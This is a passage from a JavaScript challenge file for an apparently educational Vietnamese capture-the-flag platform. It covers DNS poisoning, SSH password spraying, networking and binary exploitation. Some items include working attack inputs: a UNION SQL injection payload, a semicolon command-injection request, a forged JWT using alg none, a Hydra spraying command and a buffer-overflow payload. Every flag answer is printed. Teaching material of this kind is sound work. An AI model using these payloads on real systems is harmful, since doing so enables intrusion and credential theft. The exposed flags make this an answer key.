            4. Cờ nộp: <code>FLAG{sysctl_net.ipv4.tcp_syncookies=1}</code>.
        </div>
    </div>
</div>`,
                flag: "FLAG{sysctl_net.ipv4.tcp_syncookies=1}"
            },
            {
                id: 10,
                domain: "wan",
                domainVi: "5. Vùng Mạng WAN (WAN Domain)",
                title: "Thử Thách 10: Đầu Độc Bộ Nhớ Đệm DNS (Kaminsky Cache Poisoning)",
                category: "Tấn Công Hạ Tầng Internet (DNS Poisoning / Spoofing)",
                difficulty: "Nâng cao",
                points: 200,
                description: "Kẻ tấn công trên mạng diện rộng WAN khai thác lỗi thiết kế DNS thời kỳ đầu (Kaminsky Bug) bằng cách bắn liên tục hàng ngàn gói tin DNS Response giả mạo với các Transaction ID (TXID) ngẫu nhiên để ghi đè bản ghi A của máy chủ ngân hàng ebank.vietbank.vn trỏ về máy chủ lừa đảo. Hãy phân tích đoạn log gói tin DNS Response trúng khớp TXID để xác định IP máy chủ lừa đảo!",
                codeSnippet: `=== DNS Query sent by Resolver (Recursive Query) ===
Transaction ID: 0x4e8a
Questions: random9871.ebank.vietbank.vn: type A, class IN

=== Injected Forged DNS Response from Attacker ===
Transaction ID: 0x4e8a  <--- [TXID MATCHED! INJECTION SUCCESSFUL]
Flags: 0x8180 (Standard query response, No error)
Questions: random9871.ebank.vietbank.vn: type A, class IN
Answers:
    random9871.ebank.vietbank.vn: type A, class IN, TTL 30, addr 185.220.101.99
Authoritative nameservers:
    vietbank.vn: type NS, class IN, TTL 86400, ns.evil-phish-ns.com
Additional records:
    ns.evil-phish-ns.com: type A, class IN, TTL 86400, addr 185.220.101.99
    ebank.vietbank.vn: type A, class IN, TTL 86400, addr 185.220.101.99  <-- [POISONED CACHE!]

Định dạng cờ: FLAG{dns_poisoned_txid_0x4e8a_ip_185.220.101.99}`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • <b>Wireshark Filter</b>: <code>dns.flags.response == 1 && dns.id == 0x4e8a</code>.<br>
            • <b>Dig / Nslookup</b>: <code>dig @resolver ebank.vietbank.vn +trace</code>.<br>
            • <b>Scapy DNS module</b>: Tạo gói tin DNS Response giả mạo với bản ghi Additional authority.
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            1. Cuộc tấn công Dan Kaminsky gửi các truy vấn subdomain ngẫu nhiên để vượt qua cache và kích hoạt Resolver gửi truy vấn ra bên ngoài.<br>
            2. Khi kẻ tấn công gửi phản hồi giả mạo trùng khớp Transaction ID <b>0x4e8a</b>, phần Additional Records chứa ánh xạ độc hại trỏ ebank.vietbank.vn về IP <b>185.220.101.99</b>.<br>
            3. Ghép nối thành cờ: <code>FLAG{dns_poisoned_txid_0x4e8a_ip_185.220.101.99}</code>.
        </div>
    </div>
</div>`,
                flag: "FLAG{dns_poisoned_txid_0x4e8a_ip_185.220.101.99}"
            },

            // =========================================================================
            // DOMAIN 6: VÙNG TRUY NHẬP TỪ XA (REMOTE ACCESS DOMAIN)
            // =========================================================================
            {
                id: 11,
                domain: "remote-access",
                domainVi: "6. Vùng Truy Nhập Từ Xa (Remote Access Domain)",
                title: "Thử Thách 11: Nhật Ký Tấn Công Mật Khẩu SSH Bằng THChydra",
                category: "Tấn Công Mật Khẩu (Password Spraying / Brute-force)",
                difficulty: "Trung bình",
                points: 150,
                description: "Máy chủ SSH nội bộ mở cổng 22 ra ngoài Internet để nhân viên làm việc từ xa (Work From Home). Kẻ tấn công sử dụng công cụ Hydra thực hiện cuộc tấn công rải mật khẩu (Password Spraying) với mật khẩu phổ biến 'Welcome@2026' nhằm tránh kích hoạt cơ chế khóa tài khoản. Hãy phân tích file nhật ký xác thực /var/log/auth.log để tìm tài khoản nhân viên duy nhất bị bẻ khóa và địa chỉ IP của kẻ tấn công!",
                codeSnippet: `Nov 20 02:45:01 bastion-ssh sshd[31012]: Failed password for invalid user admin from 203.0.113.195 port 51102 ssh2
Nov 20 02:45:04 bastion-ssh sshd[31015]: Failed password for user it_support from 203.0.113.195 port 51104 ssh2
Nov 20 02:45:08 bastion-ssh sshd[31018]: Failed password for user accounting from 203.0.113.195 port 51106 ssh2
Nov 20 02:45:12 bastion-ssh sshd[31021]: Failed password for user dev_lead from 203.0.113.195 port 51108 ssh2
Nov 20 02:45:15 bastion-ssh sshd[31024]: Accepted password for user remote_vpn_user from 203.0.113.195 port 51110 ssh2
Nov 20 02:45:16 bastion-ssh sshd[31024]: pam_unix(sshd:session): session opened for user remote_vpn_user by (uid=0)

Nhiệm vụ: Trích xuất tên người dùng bị bẻ khóa và IP nguồn của kẻ tấn công.
Định dạng nộp cờ: FLAG{hydra_spray_user_<Username>_ip_<IP>}`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • <b>Linux CLI</b>: <code>grep "Accepted password" /var/log/auth.log</code>.<br>
            • <b>THChydra</b>: <code>hydra -L users.txt -p 'Welcome@2026' ssh://target.com</code>.<br>
            • <b>Fail2ban</b>: Công cụ phân tích log và tự động drop IP sau N lần thất bại.
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            1. Tấn công Password Spraying thử một mật khẩu chung cho nhiều user để lách qua Account Lockout threshold.<br>
            2. Dòng log thành công duy nhất ghi rõ: <code>Accepted password for user remote_vpn_user from 203.0.113.195</code>.<br>
            3. Tài khoản bị thỏa hiệp là <b>remote_vpn_user</b> từ địa chỉ IP <b>203.0.113.195</b>.<br>
            4. Cờ: <code>FLAG{hydra_spray_user_remote_vpn_user_ip_203.0.113.195}</code>.
        </div>
    </div>
</div>`,
                flag: "FLAG{hydra_spray_user_remote_vpn_user_ip_203.0.113.195}"
            },
            {
                id: 12,
                domain: "remote-access",
                domainVi: "6. Vùng Truy Nhập Từ Xa (Remote Access Domain)",
                title: "Thử Thách 12: Chiếm Đoạt Phiên JWT Lỗ Hổng Thuật Toán 'alg': 'none'",
                category: "Chiếm Đoạt Phiên (Session Hijacking / JWT)",
                difficulty: "Nâng cao",
                points: 200,
                description: "Cổng truy nhập từ xa SSL-VPN sử dụng JSON Web Token (JWT) trong Cookie để duy trì phiên làm việc của nhân viên. Bạn đăng nhập với tài khoản khách (role: guest). Máy chủ phía backend sử dụng thư viện JWT chưa vá lỗi kiểm tra chữ ký khi thuật toán đặt là 'none'. Hãy tạo token giả mạo với quyền quản trị viên tối cao role: admin!",
                codeSnippet: `// Token ban đầu của bạn (Signed with HS256):
// Header:  {"alg": "HS256", "typ": "JWT"}
// Payload: {"user": "viewview", "role": "guest", "iat": 1794840000}

// Yêu cầu giả mạo (JWT none algorithm attack):
// Header mới:
{
  "alg": "none",
  "typ": "JWT"
}
// Payload mới:
{
  "user": "root_admin",
  "role": "admin",
  "iat": 1794840000
}

// Lưu ý: Token có alg "none" không cần phần Signature, kết thúc bằng dấu chấm:
// eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoicm9vdF9hZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc5NDg0MDAwMH0.

Định dạng nộp cờ: FLAG{jwt_alg_none_root_admin_pwned}`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • <b>jwt.io Debugger</b>: Trực quan hóa và chỉnh sửa Header/Payload token.<br>
            • <b>Burp Suite Extension</b>: JSON Web Tokens (JWT Editor).<br>
            • <b>CyberChef</b>: Recipe <code>To Base64URL</code> cho Header và Payload.
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            1. Chuẩn RFC 7515 hỗ trợ giá trị thuật toán <code>"alg": "none"</code> cho trường hợp token không cần ký xác thực.<br>
            2. Nếu server không ép buộc thuật toán HS256/RS256, kẻ tấn công có thể thay đổi Header thành <code>alg: none</code> và sửa Payload thành quyền <code>admin</code>.<br>
            3. Cờ chứng minh thành công: <code>FLAG{jwt_alg_none_root_admin_pwned}</code>.
        </div>
    </div>
</div>`,
                flag: "FLAG{jwt_alg_none_root_admin_pwned}"
            },

            // =========================================================================
            // DOMAIN 7: VÙNG HỆ THỐNG & ỨNG DỤNG (SYSTEM & APPLICATION DOMAIN)
            // =========================================================================
            {
                id: 13,
                domain: "system-app",
                domainVi: "7. Vùng Hệ Thống & Ứng Dụng (System & App Domain)",
                title: "Thử Thách 13: Khai Thác SQL Injection UNION-Based Trích Xuất Dữ Liệu",
                category: "Tấn Công Ứng Dụng Web (SQL Injection / Data Exfiltration)",
                difficulty: "Nâng cao",
                points: 200,
                description: "Ứng dụng web Cổng thông tin doanh nghiệp nội bộ có tham số tìm kiếm nhân sự employee.php?id=1 dính lỗi SQL Injection do nối chuỗi thô. Kẻ tấn công sử dụng kỹ thuật UNION-Based để nối bảng users và trích xuất chuỗi mã băm mật khẩu MD5 của tài khoản admin. Hãy crack hash để tìm mật khẩu cờ dạng rõ!",
                codeSnippet: `-- Request gửi đến máy chủ:
GET /employee.php?id=-1' UNION SELECT 1, group_concat(username, 0x3a, password_hash), 3 FROM users-- - HTTP/1.1
Host: portal.corp.local

-- Dữ liệu hiển thị trả về trên trang web:
<div>
   <h3>Thông tin nhân sự:</h3>
   <p>Kết quả trích xuất: <b>admin:e10adc3949ba59abbe56e057f20f883e</b></p>
</div>

-- Nhiệm vụ:
-- 1. Xác định thuật toán băm của chuỗi 32 ký tự hex (MD5).
-- 2. Bẻ khóa mật khẩu dạng rõ từ chuỗi băm e10adc3949ba59abbe56e057f20f883e.
-- Định dạng cờ: FLAG{sqli_union_admin_plaintext_<mật_khẩu>}`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • <b>Burp Suite Repeater</b>: Thủ công tinh chỉnh câu lệnh SQL Injection.<br>
            • <b>sqlmap</b>: <code>sqlmap -u "http://.../employee.php?id=1" --dump</code>.<br>
            • <b>Hashcat / John the Ripper / CrackStation</b>: <code>hashcat -m 0 e10adc... rockyou.txt</code>.
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            1. Payload <code>id=-1' UNION SELECT ...</code> vô hiệu hóa kết quả truy vấn gốc để kết quả UNION xuất hiện ở cột thứ 2.<br>
            2. Chuỗi băm <code>e10adc3949ba59abbe56e057f20f883e</code> là hàm băm MD5 chuẩn của chuỗi mật khẩu huyền thoại <b>123456</b>.<br>
            3. Cờ hợp lệ: <code>FLAG{sqli_union_admin_plaintext_123456}</code>.
        </div>
    </div>
</div>`,
                flag: "FLAG{sqli_union_admin_plaintext_123456}"
            },
            {
                id: 14,
                domain: "system-app",
                domainVi: "7. Vùng Hệ Thống & Ứng Dụng (System & App Domain)",
                title: "Thử Thách 14: Thực Thi Mã Từ Xa RCE Qua Lỗ Hổng Command Injection",
                category: "Tấn Công Ứng Dụng Web (Command Injection / RCE)",
                difficulty: "Nâng cao",
                points: 250,
                description: "Trang quản trị Router nội bộ có tính năng 'Network Diagnostic Ping' cho phép kiểm tra độ trễ mạng nhưng lập trình viên sử dụng trực tiếp hàm system('ping -c 2 ' . $_POST['ip']) mà không lọc ký tự đặc biệt. Kẻ tấn công sử dụng toán tử phân tách lệnh ';' để đọc file cờ bí mật /var/secret/flag.txt. Hãy phân tích phản hồi HTTP để lấy cờ!",
                codeSnippet: `POST /admin/ping_tool.php HTTP/1.1
Host: router.internal.net
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=9a8b7c6d5e4f3a2b1c

ip=127.0.0.1%3B+cat+%2Fvar%2Fsecret%2Fflag.txt

--- HTTP/1.1 200 OK ---
Content-Type: text/plain

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.038 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.041 ms

--- 127.0.0.1 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss

[OUTPUT LỆNH KẾ TIẾP: cat /var/secret/flag.txt]:
FLAG{rce_command_injection_semicolon_root_shell}`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • <b>Burp Suite Repeater</b>: Chỉnh sửa và gửi request với các ký tự <code>;</code>, <code>|</code>, <code>&amp;&amp;</code>, <code>$(cmd)</code>.<br>
            • <b>Commix</b>: Automated All-in-One OS Command Injection and Exploitation Tool.<br>
            • <b>cURL CLI</b>: <code>curl -d "ip=127.0.0.1;id" http://router.internal.net/admin/ping_tool.php</code>.
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            1. Dấu chấm phẩy <code>;</code> trong Linux Shell cho phép thực thi tuần tự nhiều lệnh trên cùng một dòng.<br>
            2. Đoạn mã <code>127.0.0.1; cat /var/secret/flag.txt</code> sau khi hoàn tất lệnh ping sẽ thực thi ngay lệnh in nội dung cờ bí mật.<br>
            3. Cờ được trích xuất trực tiếp: <code>FLAG{rce_command_injection_semicolon_root_shell}</code>.
        </div>
    </div>
</div>`,
                flag: "FLAG{rce_command_injection_semicolon_root_shell}"
            },
            {
                id: 15,
                domain: "system-app",
                domainVi: "7. Vùng Hệ Thống & Ứng Dụng (System & App Domain)",
                title: "Thử Thách 15: Tính Toán Offset Tràn Bộ Đệm Ngăn Xếp (Stack Buffer Overflow)",
                category: "Lỗi Bộ Nhớ & Khai Thác Nhị Phân (Buffer Overflow / Exploit)",
                difficulty: "Chuyên gia",
                points: 300,
                description: "Một dịch vụ nhị phân C 32-bit x86 chạy trên Linux sử dụng hàm không an toàn strcpy(dest, src) với bộ đệm 64 bytes. Khi gửi chuỗi mẫu De Bruijn cyclic pattern 100 ký tự sinh bởi Metasploit, chương trình bị crash tại thanh ghi con trỏ lệnh EIP có giá trị 0x41326441 (ASCII: 'Ad2A'). Hãy tính toán offset chính xác và xác định địa chỉ hàm get_shell() để hoàn tất payload khai thác!",
                codeSnippet: `$ gdb -q ./vulnerable_server
Reading symbols from ./vulnerable_server...
(gdb) run < pattern_100.txt
Program received signal SIGSEGV, Segmentation fault.
0x41326441 in ?? ()

(gdb) info registers
eax            0x0                 0
ebp            0x41316441          0x41316441  ("Ad1A")
esp            0xffffd080          0xffffd080
eip            0x41326441          0x41326441  ("Ad2A" -> Ký tự ghi đè con trỏ lệnh EIP!)

$ msf-pattern_offset -q 0x41326441
[*] Exact match at offset 72

(gdb) print get_shell
$1 = {void ()} 0x080485d6 <get_shell>

Cấu trúc Exploit Payload:
Payload = [72 bytes đệm 'A'] + [4 bytes địa chỉ get_shell: \\xd6\\x85\\x04\\x08]
Định dạng nộp cờ: FLAG{bof_eip_offset_72_ret_0x080485d6}`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • <b>GDB</b> (GNU Debugger) kết hợp plugin <b>GEF / PEDA / pwndbg</b>.<br>
            • <b>Metasploit Pattern Tools</b>: <code>msf-pattern_create -l 100</code> và <code>msf-pattern_offset -q &lt;value&gt;</code>.<br>
            • <b>Pwntools (Python)</b>: <code>from pwn import *; p.sendline(b'A'*72 + p32(0x080485d6))</code>.
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            1. Trong kiến trúc x86 32-bit, tràn bộ đệm stack ghi đè từ mảng cục bộ qua saved EBP (4 bytes) rồi đến Saved Return Address (EIP).<br>
            2. Vị trí offset chính xác là <b>72 bytes</b>. Đúng sau 72 bytes này, 4 bytes kế tiếp sẽ được CPU nạp trực tiếp vào thanh ghi EIP khi hàm trả về lệnh <code>ret</code>.<br>
            3. Địa chỉ hàm mục tiêu <code>get_shell</code> là <b>0x080485d6</b>.<br>
            4. Cờ: <code>FLAG{bof_eip_offset_72_ret_0x080485d6}</code>.
        </div>
    </div>
</div>`,
                flag: "FLAG{bof_eip_offset_72_ret_0x080485d6}"
            },

            // =========================================================================
            // DOMAIN 8: GIAO THỨC MẠNG & CCNA (NETWORKING PROTOCOLS & ROUTING)
            // =========================================================================
            {
                id: 16,
                domain: "networking",
                domainVi: "8. Giao Thức Mạng CCNA (Networking Protocols)",
                title: "Thử Thách 16: Wireshark Packet Forensics (Điều Tra Bắt Gói Tin Telnet)",
                category: "Phân Tích Giao Thức",
                difficulty: "Dễ",
                points: 100,
                description: "Hệ thống IDS phát hiện một nhân viên truy cập máy chủ quản trị bằng giao thức không mã hóa qua mạng nội bộ. Hãy phân tích đoạn trích xuất gói tin Ethernet/IP/TCP bắt được bên dưới để tìm mật khẩu cờ bí mật!",
                codeSnippet: `--- FRAME 42: TCP Packet Dump on Port 23 (Telnet) ---
0000   00 50 56 c0 00 08 00 0c 29 3e 51 4a 08 00 45 00
0010   00 48 a1 b2 40 00 40 06 7c d4 c0 a8 01 0a c0 a8
0020   01 01 04 23 00 17 6f 12 8a 44 2e 84 9b 12 50 18
0030   10 00 e3 9d 00 00 50 41 53 53 20 46 4c 41 47 7b
0040   63 6c 65 61 72 5f 74 65 78 74 5f 74 65 6c 6e 65
0050   74 5f 69 73 5f 69 6e 73 65 63 75 72 65 7d 0d 0a
[ASCII Translated]:
...PASS FLAG{clear_text_telnet_is_insecure}..`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • <b>Wireshark</b>: Filter <code>tcp.port == 23</code> hoặc chuột phải chọn <b>Follow &gt; TCP Stream</b>.<br>
            • <b>Tshark CLI</b>: <code>tshark -r capture.pcap -Y "telnet" -T fields -e data.text</code>.
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            1. Telnet hoạt động trên TCP Port 23 và hoàn toàn không mã hóa dữ liệu truyền.<br>
            2. Cờ Flag nằm trực tiếp sau chuỗi 'PASS ' trong phần dịch mã ASCII của gói tin.<br>
            3. Cờ: <code>FLAG{clear_text_telnet_is_insecure}</code>.
        </div>
    </div>
</div>`,
                flag: "FLAG{clear_text_telnet_is_insecure}"
            },
            {
                id: 17,
                domain: "networking",
                domainVi: "8. Giao Thức Mạng CCNA (Networking Protocols)",
                title: "Thử Thách 17: Subnetting Broadcast Gate (Bẻ Khóa Mạng Con Ngầm)",
                category: "Tính Toán Mạng Con",
                difficulty: "Trung bình",
                points: 150,
                description: "Máy chủ bảo mật của bạn đang ở chế độ ngủ (Standby) tại địa chỉ IP: 172.28.140.219/21. Để đánh thức máy chủ bằng gói tin Wake-on-LAN qua Router, bạn phải tính toán chính xác địa chỉ Directed Broadcast IP của mạng con này!",
                codeSnippet: `Target IP: 172.28.140.219
Prefix: /21
Nhiệm vụ: Tính toán Directed Broadcast Address của mạng con này.
Định dạng cờ nộp bài: FLAG{<Broadcast_IP>} (Ví dụ: FLAG{172.28.x.255})`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • <b>ipcalc CLI</b>: <code>ipcalc 172.28.140.219/21</code>.<br>
            • <b>Python ipaddress</b>: <code>python3 -c "import ipaddress; print(ipaddress.IPv4Network('172.28.140.219/21', strict=False).broadcast_address)"</code>.
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            1. /21 có Subnet Mask là 255.255.248.0 (21 bit mạng, 11 bit host).<br>
            2. Bước nhảy (block size) ở octet 3: 256 - 248 = 8.<br>
            3. Octet 3 là 140; 140 / 8 = 17 dư 4 -> Network Octet 3 = 17 * 8 = 136. Broadcast Octet 3 = 136 + 8 - 1 = 143.<br>
            4. Địa chỉ Broadcast: <b>172.28.143.255</b>.<br>
            5. Cờ: <code>FLAG{172.28.143.255}</code>.
        </div>
    </div>
</div>`,
                flag: "FLAG{172.28.143.255}"
            },
            {
                id: 18,
                domain: "networking",
                domainVi: "8. Giao Thức Mạng CCNA (Networking Protocols)",
                title: "Thử Thách 18: Cisco Firewall ACL Bypass (Xuyên Thủng Tường Lửa)",
                category: "Bảo Mật Tường Lửa",
                difficulty: "Trung bình",
                points: 150,
                description: "Tường lửa Cisco ASA được cấu hình bộ quy tắc Extended ACL sau đây để bảo vệ máy chủ Web tài chính 10.20.30.40. Cổng dịch vụ TCP bảo mật nào được phép truyền dữ liệu qua tường lửa mà không bị lệnh Implicit Deny chặn lại?",
                codeSnippet: `Router# show access-lists 105
Extended IP access list 105
    10 permit tcp any host 10.20.30.40 eq 443
    20 permit udp any host 10.20.30.40 eq 53
    30 deny ip any any (implicit default)

Nhiệm vụ: Nhập số hiệu cổng TCP được phép đi qua tường lửa vào cấu trúc cờ:
FLAG{tcp_port_<số_cổng>_https}`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • <b>Cisco IOS CLI</b>: <code>show access-lists 105</code>.<br>
            • <b>Nmap Port Scan</b>: <code>nmap -sS -p 443,53,80 10.20.30.40</code> để xác định cổng Filtered vs Open.
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            1. Xem dòng 10: <code>permit tcp any host 10.20.30.40 eq 443</code> cho phép lưu lượng TCP cổng 443 (HTTPS).<br>
            2. Cờ: <code>FLAG{tcp_port_443_https}</code>.
        </div>
    </div>
</div>`,
                flag: "FLAG{tcp_port_443_https}"
            },
            {
                id: 19,
                domain: "networking",
                domainVi: "8. Giao Thức Mạng CCNA (Networking Protocols)",
                title: "Thử Thách 19: OSPF Metric Shortest Path (Tối Ưu Tuyến Đường OSPF)",
                category: "Định Tuyến Động",
                difficulty: "Trung bình",
                points: 200,
                description: "Một gói tin dữ liệu cần đi từ Router A đến Router D qua mạng OSPF. Công thức Cost = 100 Mbps / Bandwidth. Tuyến A -> B -> D có băng thông A-B là 100 Mbps (Cost 1) và B-D là 10 Mbps (Cost 10). Tuyến A -> C -> D có băng thông A-C là 1 Gbps (Cost 1) và C-D là 1 Gbps (Cost 1). Tổng Cost của tuyến đường tối ưu được OSPF lựa chọn là bao nhiêu?",
                codeSnippet: `Tuyến 1: A -> B -> D (Tổng Cost: 1 + 10 = 11)
Tuyến 2: A -> C -> D (Tổng Cost: 1 + 1 = 2)

Nhiệm vụ: Nhập tổng chi phí Cost và tên tuyến đường tối ưu theo định dạng:
FLAG{cost_<số_cost>_path_<tên_tuyến>} (Ví dụ: FLAG{cost_2_path_acd})`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • <b>Cisco IOS CLI</b>: <code>show ip ospf database</code>, <code>show ip route ospf</code>.<br>
            • Thuật toán Dijkstra SPF (Shortest Path First).
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            1. OSPF luôn lựa chọn đường đi có tổng Metric (Cost) nhỏ nhất.<br>
            2. Tuyến A -&gt; C -&gt; D có tổng Cost = 1 + 1 = 2 (nhỏ hơn 11 của tuyến ABD).<br>
            3. Cờ: <code>FLAG{cost_2_path_acd}</code>.
        </div>
    </div>
</div>`,
                flag: "FLAG{cost_2_path_acd}"
            },
            {
                id: 20,
                domain: "networking",
                domainVi: "8. Giao Thức Mạng CCNA (Networking Protocols)",
                title: "Thử Thách 20: Rogue DHCP Server Hunt (Truy Lùng Máy Chủ DHCP Giả Mạo)",
                category: "Phân Tích Tấn Công",
                difficulty: "Nâng cao",
                points: 200,
                description: "Người dùng trong văn phòng phàn nàn bị cấp sai Default Gateway. Bật tính năng DHCP Snooping trên Switch phát hiện bảng log sau. Hãy tìm ra địa chỉ MAC của thiết bị giả mạo gắn vào cổng Untrusted!",
                codeSnippet: `Switch# show ip dhcp snooping binding
MacAddress          IpAddress        Lease(sec)  Type            VLAN  Interface
------------------  ---------------  ----------  --------------  ----  -----------------
00:1A:2B:3C:4D:5E   192.168.1.100    86400       dhcp-snooping   10    GigabitEthernet0/1 [TRUSTED]
F4:0F:24:99:AA:BB   192.168.1.254    86400       dhcp-snooping   10    FastEthernet0/24   [UNTRUSTED_ALERT]

Nhiệm vụ: Cờ chính là địa chỉ MAC của kẻ tấn công: FLAG{<MAC_ADDRESS>}`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • <b>Cisco Switch CLI</b>: <code>show ip dhcp snooping binding</code>.<br>
            • <b>Wireshark Filter</b>: <code>bootp.option.dhcp == 2</code> (DHCP Offer).
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            1. Cổng FastEthernet0/24 là cổng không tin cậy (Untrusted) đã tự ý gửi gói DHCP Offer cấp phát IP 192.168.1.254.<br>
            2. Địa chỉ MAC của Rogue DHCP Server là <b>F4:0F:24:99:AA:BB</b>.<br>
            3. Cờ: <code>FLAG{F4:0F:24:99:AA:BB}</code>.
        </div>
    </div>
</div>`,
                flag: "FLAG{F4:0F:24:99:AA:BB}"
            },
            {
                id: 21,
                domain: "networking",
                domainVi: "8. Giao Thức Mạng CCNA (Networking Protocols)",
                title: "Thử Thách 21: TCP 3-Way Handshake Cracking (Bắt Tay 3 Bước TCP)",
                category: "Giao Thức Lớp 4",
                difficulty: "Nâng cao",
